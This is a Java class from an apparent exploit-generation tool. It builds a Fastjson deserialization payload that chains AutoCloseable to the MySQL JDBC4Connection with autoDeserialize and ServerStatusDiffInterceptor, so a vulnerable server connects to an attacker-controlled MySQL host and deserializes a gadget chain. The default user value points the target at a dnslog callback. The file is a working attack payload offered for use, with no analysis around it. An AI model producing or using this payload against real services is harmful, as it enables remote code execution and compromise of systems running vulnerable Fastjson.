package com.ding0x0.fastjson;

import com.ding0x0.Payload;

public class jdbcPayload extends Payload {

    String url;
    String port;
    String user;
    String statement;

    String template = "[+] mysql jdbc deserialization\n"+
            "{\n" +
            "    \"@type\":\"java.lang.AutoCloseable\",\n" +
            "    \"@type\":\"com.mysql.jdbc.JDBC4Connection\",  \n" +
            "    \"hostToConnectTo\":\"%s\",  \n" +
            "    \"portToConnectTo\":%s,  \n" +
            "    \"info\": {\n" +
            "        \"user\":\"%s\",    \n" +
            "        \"password\":\"pass\",\n" +
            "        \"statementInterceptors\":\"%s\",    \n" +
            "        \"autoDeserialize\":\"true\",    \n" +
            "        \"NUM_HOSTS\": \"1\"\n" +
            "    },  \n" +
            "    \"databaseToConnectTo\":\"dbname\",  \n" +
            "    \"url\": \"\"\n" +
            "}";

    public jdbcPayload(String url, String port, String user, String statement){
        this.url = url;
        this.port = port;
        this.user = user;
        this.statement = statement;
        if (this.user == null){
            this.user = "yso_URLDNS_http://xxx.dnslog.cn";
        }
        if (this.statement == null){
            this.statement = "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";
        }
    }

    public String format(){
        return String.format(this.template, this.url, this.port, this.user, this.statement);
    }
}
